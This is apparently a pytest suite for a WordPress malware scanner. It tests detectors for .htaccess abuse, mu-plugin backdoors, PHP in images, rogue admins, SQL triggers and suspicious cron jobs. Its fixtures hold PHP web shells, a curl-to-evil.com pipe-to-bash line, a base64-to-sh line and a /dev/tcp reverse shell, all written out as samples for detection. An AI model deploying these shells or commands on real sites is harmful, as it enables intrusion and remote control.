"""
CleanShift Test Suite — Extended Scanner & Enhancement Tests
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tests for:
- SecurityStack detection
- HtaccessScanner
- MuPluginScanner
- ImageScanner
- ConfigScanner
- SystemScanner
- DatabaseScanner enhancements (SQL triggers, recent admins, JS injections,
  application passwords, Imunify whitelist)

Uses pytest fixtures, mock filesystem with tmp_path, mock database with MagicMock.
Python 3.6+ compatible.
"""

from __future__ import annotations

import os
import re
import stat
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch, call

import pytest

from agent.src.scanner import (
    DatabaseScanner,
    ScanMode,
    SiteScanner,
)
from agent.src.models import (
    Severity,
    Threat,
    ThreatType,
    WordPressSite,
)

# Try importing extended scanners — tests that require them will skip if unavailable
try:
    from agent.src.extended_scanners import (
        HtaccessScanner,
        MuPluginScanner,
        ImageScanner,
        ConfigScanner,
        SystemScanner,
        SecurityStack,
    )
    EXTENDED_AVAILABLE = True
except ImportError:
    EXTENDED_AVAILABLE = False


# ─── Fixtures ───────────────────────────────────────────────────────

@pytest.fixture
def mock_intel():
    """Create a mock IntelligenceDB for scanner tests."""
    intel = MagicMock()
    intel.backdoor_filenames = []
    intel.malware_domains = []
    intel.vulnerable_plugins = []
    intel.rogue_admin_patterns = []
    intel.db_markers = []
    intel.match_filename.return_value = None
    intel.match_domain.return_value = None
    intel.match_plugin.return_value = None
    intel.match_db_option.return_value = None
    intel.get_rogue_admin_patterns.return_value = []
    intel.get_detection_queries.return_value = []
    return intel


@pytest.fixture
def wp_site(tmp_path):
    """Create a minimal WordPress site structure."""
    site_path = tmp_path / "public_html"
    site_path.mkdir()

    # Core directories
    (site_path / "wp-admin").mkdir()
    (site_path / "wp-includes").mkdir()
    (site_path / "wp-content").mkdir()
    (site_path / "wp-content" / "uploads").mkdir(parents=True)
    (site_path / "wp-content" / "plugins").mkdir()
    (site_path / "wp-content" / "themes").mkdir()
    (site_path / "wp-content" / "mu-plugins").mkdir()

    # wp-config.php
    (site_path / "wp-config.php").write_text(
        "<?php\n"
        "define('DB_NAME', 'testdb');\n"
        "define('DB_USER', 'testuser');\n"
        "define('DB_PASSWORD', 'testpass');\n"
        "define('DB_HOST', 'localhost');\n"
        "$table_prefix = 'wp_';\n"
    )

    # .htaccess
    (site_path / ".htaccess").write_text(
        "# BEGIN WordPress\n"
        "RewriteEngine On\n"
        "RewriteBase /\n"
        "RewriteRule ^index.php$ - [L]\n"
        "RewriteRule . /index.php [L]\n"
        "# END WordPress\n"
    )

    return WordPressSite(
        path=str(site_path),
        domain="example.com",
        wp_version="6.5.2",
        db_host="localhost",
        db_name="testdb",
        db_user="testuser",
        db_pass="testpass",
        db_prefix="wp_",
        site_owner="testuser",
    )


@pytest.fixture
def mock_db_conn():
    """Create a mock database connection with cursor context manager."""
    conn = MagicMock()
    cursor = MagicMock()
    cursor.__enter__ = MagicMock(return_value=cursor)
    cursor.__exit__ = MagicMock(return_value=False)
    conn.cursor.return_value = cursor
    return conn, cursor


# ─── SecurityStack Tests ──────────────────────────────────────────

class TestSecurityStack:
    """Tests for security stack detection."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detect_returns_valid_object(self):
        """SecurityStack.detect() should return an object with boolean attributes."""
        stack = SecurityStack.detect()
        assert hasattr(stack, "imunify360")
        assert hasattr(stack, "cpguard")
        assert hasattr(stack, "csf")
        assert hasattr(stack, "modsecurity")
        assert hasattr(stack, "fail2ban")
        # All should be booleans
        assert isinstance(stack.imunify360, bool)
        assert isinstance(stack.csf, bool)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detect_doesnt_crash(self):
        """SecurityStack.detect() should not raise any exceptions."""
        try:
            stack = SecurityStack.detect()
        except Exception as e:
            pytest.fail("SecurityStack.detect() raised: %s" % e)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_security_stack_summary(self):
        """SecurityStack should provide a summary of detected systems."""
        stack = SecurityStack.detect()
        summary = stack.summary_text()
        assert isinstance(summary, str)
        assert len(summary) > 0


# ─── HtaccessScanner Tests ────────────────────────────────────────

class TestHtaccessScanner:
    """Tests for .htaccess malware detection."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detects_auto_prepend_file(self, mock_intel, wp_site):
        """Should detect auto_prepend_file directive in .htaccess."""
        site_path = Path(wp_site.path)
        (site_path / ".htaccess").write_text(
            "# BEGIN WordPress\n"
            "auto_prepend_file = /tmp/malware.php\n"
            "RewriteEngine On\n"
            "# END WordPress\n"
        )

        scanner = HtaccessScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("auto_prepend" in t.title.lower() or "auto_prepend" in t.evidence.lower()
                    for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detects_sethandler_php(self, mock_intel, wp_site):
        """Should detect SetHandler application/x-httpd-php on images."""
        site_path = Path(wp_site.path)
        uploads_dir = site_path / "wp-content" / "uploads"
        (uploads_dir / ".htaccess").write_text(
            "<FilesMatch \"\\.(jpg|png|gif)$\">\n"
            "SetHandler application/x-httpd-php\n"
            "</FilesMatch>\n"
        )

        scanner = HtaccessScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_clean_htaccess_passes(self, mock_intel, wp_site):
        """Clean .htaccess with standard WordPress rules should not trigger alerts."""
        site_path = Path(wp_site.path)
        (site_path / ".htaccess").write_text(
            "# BEGIN WordPress\n"
            "<IfModule mod_rewrite.c>\n"
            "RewriteEngine On\n"
            "RewriteBase /\n"
            "RewriteRule ^index\\.php$ - [L]\n"
            "RewriteCond %{REQUEST_FILENAME} !-f\n"
            "RewriteCond %{REQUEST_FILENAME} !-d\n"
            "RewriteRule . /index.php [L]\n"
            "</IfModule>\n"
            "# END WordPress\n"
        )

        scanner = HtaccessScanner(mock_intel)
        threats = scanner.scan(wp_site)

        # No threats for standard WordPress .htaccess
        assert len(threats) == 0


# ─── MuPluginScanner Tests ────────────────────────────────────────

class TestMuPluginScanner:
    """Tests for mu-plugins scanning."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detects_php_in_mu_plugins(self, mock_intel, wp_site):
        """Should flag PHP files in mu-plugins directory."""
        site_path = Path(wp_site.path)
        mu_dir = site_path / "wp-content" / "mu-plugins"
        (mu_dir / "backdoor.php").write_text(
            "<?php\n"
            "eval(base64_decode($_POST['cmd']));\n"
            "system($cmd);\n"
        )

        scanner = MuPluginScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("mu-plugin" in t.title.lower() or "backdoor" in t.title.lower()
                    for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_empty_mu_plugins_is_clean(self, mock_intel, wp_site):
        """Empty mu-plugins directory should produce no threats."""
        scanner = MuPluginScanner(mock_intel)
        threats = scanner.scan(wp_site)

        # Empty directory or legitimate files only — no threats
        suspicious_threats = [
            t for t in threats
            if t.severity in (Severity.HIGH, Severity.CRITICAL)
        ]
        assert len(suspicious_threats) == 0


# ─── ImageScanner Tests ──────────────────────────────────────────

class TestImageScanner:
    """Tests for PHP-in-image detection."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_detects_php_in_jpeg_header(self, mock_intel, wp_site):
        """Should detect PHP code embedded in JPEG file headers."""
        site_path = Path(wp_site.path)
        uploads = site_path / "wp-content" / "uploads"

        # Create a fake JPEG with PHP in the header
        # JPEG magic bytes + PHP code
        fake_jpeg = b"\xff\xd8\xff\xe0" + b"<?php eval($_GET['x']); ?>" + b"\x00" * 100
        (uploads / "malicious.jpg").write_bytes(fake_jpeg)

        scanner = ImageScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("php" in t.title.lower() or "image" in t.title.lower()
                    for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_clean_image_passes(self, mock_intel, wp_site):
        """Clean image file should not trigger alerts."""
        site_path = Path(wp_site.path)
        uploads = site_path / "wp-content" / "uploads"

        # Create a minimal valid JPEG-like file (no PHP)
        clean_jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + b"\x00" * 200
        (uploads / "clean.jpg").write_bytes(clean_jpeg)

        scanner = ImageScanner(mock_intel)
        threats = scanner.scan(wp_site)

        # No PHP in images — should be clean
        php_threats = [
            t for t in threats
            if "php" in t.title.lower() and "clean.jpg" in str(t.location)
        ]
        assert len(php_threats) == 0

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_svg_with_script_detection(self, mock_intel, wp_site):
        """Should detect script tags in SVG files."""
        site_path = Path(wp_site.path)
        uploads = site_path / "wp-content" / "uploads"

        svg_content = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg">\n'
            '<script type="text/javascript">\n'
            'alert(document.cookie);\n'
            '</script>\n'
            '</svg>\n'
        )
        (uploads / "evil.svg").write_text(svg_content)

        scanner = ImageScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("svg" in t.title.lower() or "script" in t.title.lower()
                    for t in threats)


# ─── ConfigScanner Tests ─────────────────────────────────────────

class TestConfigScanner:
    """Tests for configuration file scanning."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_wp_config_bak_detection(self, mock_intel, wp_site):
        """Should detect wp-config.php.bak backup files."""
        site_path = Path(wp_site.path)
        (site_path / "wp-config.php.bak").write_text(
            "<?php\n"
            "define('DB_NAME', 'proddb');\n"
            "define('DB_PASSWORD', 'secret123');\n"
        )

        scanner = ConfigScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("config" in t.title.lower() or "backup" in t.title.lower()
                    for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_debug_log_detection(self, mock_intel, wp_site):
        """Should detect debug.log file which may contain sensitive info."""
        site_path = Path(wp_site.path)
        (site_path / "wp-content" / "debug.log").write_text(
            "[06-Jun-2026 10:00:00 UTC] PHP Warning: something\n"
            "DB_PASSWORD exposed in stack trace\n"
        )

        scanner = ConfigScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("debug" in t.title.lower() for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_wp_debug_detection(self, mock_intel, wp_site):
        """Should detect WP_DEBUG enabled in production."""
        site_path = Path(wp_site.path)
        (site_path / "wp-config.php").write_text(
            "<?php\n"
            "define('DB_NAME', 'testdb');\n"
            "define('WP_DEBUG', true);\n"
            "define('WP_DEBUG_LOG', true);\n"
            "define('WP_DEBUG_DISPLAY', true);\n"
        )

        scanner = ConfigScanner(mock_intel)
        threats = scanner.scan(wp_site)

        assert len(threats) >= 1
        assert any("debug" in t.title.lower() for t in threats)

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_executable_php_detection(self, mock_intel, wp_site):
        """Should detect PHP files that shouldn't be executable."""
        site_path = Path(wp_site.path)
        test_file = site_path / "wp-config.php"
        # Make executable
        test_file.chmod(0o755)

        scanner = ConfigScanner(mock_intel)
        threats = scanner.scan(wp_site)

        # Should flag executable PHP files
        exec_threats = [t for t in threats if "execut" in t.title.lower() or
                       "permission" in t.title.lower()]
        # This depends on the implementation — at minimum it shouldn't crash
        assert isinstance(threats, list)


# ─── DatabaseScanner Enhancement Tests ────────────────────────────

class TestDatabaseEnhancements:
    """Tests for new DatabaseScanner methods."""

    def test_sql_trigger_detection_query(self, mock_intel, mock_db_conn):
        """Should execute SHOW TRIGGERS and flag any results."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = [
            {
                "Trigger": "evil_trigger",
                "Table": "wp_users",
                "Event": "INSERT",
                "Timing": "AFTER",
                "Statement": "INSERT INTO hacker_table SELECT * FROM wp_users",
            }
        ]

        site = WordPressSite(
            path="/test/site",
            domain="test.com",
            db_name="testdb",
            db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_sql_triggers(conn, site)

        # Should execute SHOW TRIGGERS
        cursor.execute.assert_called_once_with("SHOW TRIGGERS")

        # Should find the trigger
        assert len(threats) == 1
        assert threats[0].severity == Severity.CRITICAL
        assert "evil_trigger" in threats[0].title
        assert threats[0].details["table"] == "wp_users"
        assert threats[0].details["event"] == "INSERT"

    def test_sql_trigger_empty_database(self, mock_intel, mock_db_conn):
        """No triggers should produce no threats."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = []

        site = WordPressSite(
            path="/test/site", domain="test.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_sql_triggers(conn, site)

        assert len(threats) == 0

    def test_imunify_transient_whitelist(self, mock_intel):
        """Imunify360 transient options should be whitelisted."""
        scanner = DatabaseScanner(mock_intel)

        # Should be whitelisted
        assert scanner._is_whitelisted_option(
            "_transient_imunify_security_rules_v2"
        ) is True
        assert scanner._is_whitelisted_option(
            "_transient_timeout_feed_abc123"
        ) is True

        # Should NOT be whitelisted
        assert scanner._is_whitelisted_option(
            "hack_file"
        ) is False
        assert scanner._is_whitelisted_option(
            "evil_option"
        ) is False

    def test_site_transient_whitelist_with_legit_prefix(self, mock_intel):
        """Site transients with known serialized prefixes should be whitelisted."""
        scanner = DatabaseScanner(mock_intel)

        # Legitimate serialized data
        assert scanner._is_whitelisted_option(
            "_site_transient_browser_check",
            "a:0:{}"
        ) is True

        # Suspicious content shouldn't be whitelisted
        assert scanner._is_whitelisted_option(
            "_site_transient_browser_check",
            "eval(base64_decode('malware'))"
        ) is False

    def test_recent_admin_detection_disposable_email(self, mock_intel, mock_db_conn):
        """Should flag admins with disposable email domains."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = [
            {
                "ID": 99,
                "user_login": "hacker_admin",
                "user_email": "hacker@yopmail.com",
                "user_registered": "2026-05-01 10:00:00",
            }
        ]

        site = WordPressSite(
            path="/test/site", domain="example.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_recent_admins(conn, site)

        assert len(threats) >= 1
        assert threats[0].severity == Severity.HIGH
        assert "hacker_admin" in threats[0].title
        assert any("disposable" in r for r in threats[0].details.get("reasons", []))

    def test_recent_admin_detection_wordpress_email(self, mock_intel, mock_db_conn):
        """Should flag admins using @wordpress.com/@wordpress.org emails."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = [
            {
                "ID": 100,
                "user_login": "wp_support",
                "user_email": "support@wordpress.com",
                "user_registered": "2026-06-01 08:00:00",
            }
        ]

        site = WordPressSite(
            path="/test/site", domain="mysite.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_recent_admins(conn, site)

        assert len(threats) >= 1
        assert any("wordpress.com" in r for r in threats[0].details.get("reasons", []))

    def test_recent_admin_clean_email(self, mock_intel, mock_db_conn):
        """Admin with site-matching email should not be flagged."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = [
            {
                "ID": 1,
                "user_login": "admin",
                "user_email": "admin@example.com",
                "user_registered": "2026-05-15 12:00:00",
            }
        ]

        site = WordPressSite(
            path="/test/site", domain="example.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_recent_admins(conn, site)

        assert len(threats) == 0

    def test_js_injection_string_from_char_code(self, mock_intel, mock_db_conn):
        """Should detect String.fromCharCode() in posts."""
        conn, cursor = mock_db_conn

        # First query returns String.fromCharCode results
        cursor.fetchall.side_effect = [
            [  # First query: String.fromCharCode
                {
                    "ID": 42,
                    "post_title": "About Us",
                    "post_type": "page",
                    "content_preview": "<script>var a=String.fromCharCode(104,116,116);</script>",
                }
            ],
            [],  # Second query: createElement
            [],  # Third query: base64 options
        ]

        site = WordPressSite(
            path="/test/site", domain="test.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_js_injections(conn, site)

        assert len(threats) >= 1
        assert any("String.fromCharCode" in t.description for t in threats)

    def test_application_password_detection(self, mock_intel, mock_db_conn):
        """Should detect application passwords in usermeta."""
        conn, cursor = mock_db_conn
        cursor.fetchall.return_value = [
            {
                "ID": 1,
                "user_login": "admin",
                "user_email": "admin@test.com",
                "app_passwords": 'a:1:{i:0;a:4:{s:4:"name";s:6:"MyApp1";}}',
            }
        ]

        site = WordPressSite(
            path="/test/site", domain="test.com",
            db_name="testdb", db_prefix="wp_",
        )

        scanner = DatabaseScanner(mock_intel)
        threats = scanner._scan_application_passwords(conn, site)

        assert len(threats) == 1
        assert threats[0].severity == Severity.MEDIUM
        assert "application password" in threats[0].title.lower()
        assert threats[0].details["user_login"] == "admin"

    def test_scan_calls_all_8_methods(self, mock_intel):
        """DatabaseScanner.scan() should call all 8 scan methods."""
        scanner = DatabaseScanner(mock_intel)

        # Mock the connection
        with patch.object(scanner, "_connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn

            # Mock all scan methods
            with patch.object(scanner, "_scan_rogue_admins", return_value=[]) as m1, \
                 patch.object(scanner, "_scan_db_markers", return_value=[]) as m2, \
                 patch.object(scanner, "_scan_script_injections", return_value=[]) as m3, \
                 patch.object(scanner, "_run_detection_queries", return_value=[]) as m4, \
                 patch.object(scanner, "_scan_sql_triggers", return_value=[]) as m5, \
                 patch.object(scanner, "_scan_recent_admins", return_value=[]) as m6, \
                 patch.object(scanner, "_scan_js_injections", return_value=[]) as m7, \
                 patch.object(scanner, "_scan_application_passwords", return_value=[]) as m8:

                site = WordPressSite(
                    path="/test", domain="test.com",
                    db_name="testdb", db_prefix="wp_",
                )
                scanner.scan(site)

                # All 8 methods should have been called
                m1.assert_called_once()
                m2.assert_called_once()
                m3.assert_called_once()
                m4.assert_called_once()
                m5.assert_called_once()
                m6.assert_called_once()
                m7.assert_called_once()
                m8.assert_called_once()

    def test_scan_progress_reports_8_steps(self, mock_intel):
        """DatabaseScanner.scan() should report progress with 8 total steps."""
        progress_calls = []

        def progress_cb(phase, detail, current, total):
            progress_calls.append((phase, detail, current, total))

        scanner = DatabaseScanner(mock_intel, progress_callback=progress_cb)

        with patch.object(scanner, "_connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn

            # Mock all scan methods
            for method_name in [
                "_scan_rogue_admins", "_scan_db_markers",
                "_scan_script_injections", "_run_detection_queries",
                "_scan_sql_triggers", "_scan_recent_admins",
                "_scan_js_injections", "_scan_application_passwords",
            ]:
                setattr(scanner, method_name, MagicMock(return_value=[]))

            site = WordPressSite(
                path="/test", domain="test.com",
                db_name="testdb", db_prefix="wp_",
            )
            scanner.scan(site)

        # All progress calls should have total=8
        assert len(progress_calls) == 8
        for _, _, current, total in progress_calls:
            assert total == 8
        # Current should go 1-8
        currents = [c for _, _, c, _ in progress_calls]
        assert currents == [1, 2, 3, 4, 5, 6, 7, 8]


# ─── SystemScanner Tests ─────────────────────────────────────────

class TestSystemScanner:
    """Tests for system-level scanning (cron files)."""

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_cron_file_parsing(self, mock_intel, tmp_path):
        """Should parse crontab files and detect suspicious entries."""
        # Create a fake crontab
        cron_file = tmp_path / "crontab"
        cron_file.write_text(
            "# Normal WordPress cron\n"
            "*/5 * * * * /usr/bin/php /home/user/public_html/wp-cron.php\n"
            "# Suspicious entries\n"
            '0 * * * * curl -s http://evil.com/payload.sh | bash\n'
            "30 2 * * * echo 'base64 decode test' | base64 --decode | sh\n"
        )

        scanner = SystemScanner(mock_intel)
        # Test cron parsing if the method exists
        if hasattr(scanner, "_parse_cron_file"):
            entries = scanner._parse_cron_file(str(cron_file))
            assert len(entries) >= 2  # At least the two command lines

    @pytest.mark.skipif(not EXTENDED_AVAILABLE, reason="Extended scanners not available")
    def test_suspicious_cron_detection(self, mock_intel, tmp_path):
        """Should flag cron entries with known suspicious patterns."""
        scanner = SystemScanner(mock_intel)

        # Test pattern matching if the method exists
        if hasattr(scanner, "_is_suspicious_cron"):
            # These should be suspicious
            assert scanner._is_suspicious_cron(
                "curl -s http://evil.com/payload.sh | bash"
            ) is True
            assert scanner._is_suspicious_cron(
                "echo 'payload' | base64 --decode | sh"
            ) is True
            assert scanner._is_suspicious_cron(
                "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
            ) is True

            # These should be clean
            assert scanner._is_suspicious_cron(
                "/usr/bin/php /home/user/public_html/wp-cron.php"
            ) is False


# ─── Watcher Tests ────────────────────────────────────────────────

class TestWatcher:
    """Tests for the file watcher module."""

    def test_quick_scan_detects_php_in_uploads(self, tmp_path):
        """quick_scan_file should detect PHP in uploads directory."""
        from agent.src.watcher import quick_scan_file

        uploads = tmp_path / "wp-content" / "uploads"
        uploads.mkdir(parents=True)
        malicious = uploads / "evil.php"
        malicious.write_text("<?php eval($_GET['cmd']); ?>")

        result = quick_scan_file(str(malicious))
        assert result is not None
        assert "PHP" in result or "uploads" in result

    def test_quick_scan_detects_htaccess_threat(self, tmp_path):
        """quick_scan_file should detect auto_prepend_file in .htaccess."""
        from agent.src.watcher import quick_scan_file

        htaccess = tmp_path / ".htaccess"
        htaccess.write_text("php_value auto_prepend_file /tmp/malware.php\n")

        result = quick_scan_file(str(htaccess))
        assert result is not None
        assert "auto_prepend" in result.lower() or ".htaccess" in result

    def test_quick_scan_clean_file(self, tmp_path):
        """quick_scan_file should return None for non-suspicious files."""
        from agent.src.watcher import quick_scan_file

        clean = tmp_path / "readme.txt"
        clean.write_text("This is a clean readme file.")

        result = quick_scan_file(str(clean))
        assert result is None

    def test_polling_watcher_detects_changes(self, tmp_path):
        """PollingWatcher should detect file modifications."""
        from agent.src.watcher import PollingWatcher

        watcher = PollingWatcher(poll_interval=0.1)

        # Create a test file
        test_file = tmp_path / "test.php"
        test_file.write_text("<?php // original")

        # Add watch
        watcher.add_watch(str(tmp_path))

        # Modify the file
        import time
        time.sleep(0.2)
        test_file.write_text("<?php // modified")

        # Poll for changes
        events = watcher.read_events()

        # Should detect the modification
        assert len(events) >= 1
        watcher.close()

    def test_discover_wp_sites(self, tmp_path):
        """discover_wp_sites should find WordPress installations."""
        from agent.src.watcher import discover_wp_sites

        # Create a fake WP site structure
        user_dir = tmp_path / "testuser" / "public_html"
        user_dir.mkdir(parents=True)
        (user_dir / "wp-config.php").write_text("<?php // WP Config")

        sites = discover_wp_sites(str(tmp_path))
        assert len(sites) == 1
        assert str(user_dir) in sites[0]


# ─── IOC Database Tests ──────────────────────────────────────────

class TestIOCExpansion:
    """Tests for the expanded IOC database sections."""

    def test_ioc_database_loads_new_sections(self):
        """IOC database should load all new sections without errors."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        # Verify new sections exist
        assert "htaccess_patterns" in data, "Missing htaccess_patterns section"
        assert "config_backup_patterns" in data, "Missing config_backup_patterns section"
        assert "spam_keywords" in data, "Missing spam_keywords section"
        assert "disposable_email_domains" in data, "Missing disposable_email_domains section"
        assert "suspicious_cron_patterns" in data, "Missing suspicious_cron_patterns section"

    def test_htaccess_patterns_content(self):
        """htaccess_patterns should contain key malicious directives."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        patterns = data.get("htaccess_patterns", [])
        pattern_strings = [p["pattern"] for p in patterns]

        assert "auto_prepend_file" in pattern_strings
        assert "php_flag engine on" in pattern_strings
        assert any("SetHandler" in p for p in pattern_strings)
        assert any("AddType" in p for p in pattern_strings)

    def test_config_backup_patterns_content(self):
        """config_backup_patterns should list common backup file names."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        backups = data.get("config_backup_patterns", [])
        filenames = [b["filename"] for b in backups]

        assert "wp-config.php.bak" in filenames
        assert "wp-config.php.old" in filenames
        assert "wp-config.php.swp" in filenames
        assert ".wp-config.php" in filenames

    def test_disposable_email_domains_content(self):
        """disposable_email_domains should contain known throwaway services."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        domains = data.get("disposable_email_domains", [])
        domain_names = [d["domain"] for d in domains]

        assert "tempmail.com" in domain_names
        assert "yopmail.com" in domain_names
        assert "guerrillamail.com" in domain_names
        assert "mailinator.com" in domain_names
        assert "10minutemail.com" in domain_names

    def test_suspicious_cron_patterns_content(self):
        """suspicious_cron_patterns should include reverse shell patterns."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        cron_patterns = data.get("suspicious_cron_patterns", [])
        patterns = [c["pattern"] for c in cron_patterns]

        assert any("curl" in p for p in patterns)
        assert any("wget" in p for p in patterns)
        assert any("base64" in p for p in patterns)
        assert any("/dev/tcp" in p for p in patterns)

    def test_spam_keywords_categories(self):
        """spam_keywords should cover pharma, tech support, and financial categories."""
        import yaml

        ioc_path = Path(__file__).resolve().parent.parent.parent / "intelligence" / "indicators" / "ioc-database.yaml"
        if not ioc_path.exists():
            pytest.skip("IOC database not found")

        with open(str(ioc_path), "r") as f:
            data = yaml.safe_load(f)

        keywords = data.get("spam_keywords", [])
        categories = {kw.get("category", "") for kw in keywords}

        assert "pharma" in categories
        assert "tech_support_scam" in categories
        assert "financial_spam" in categories
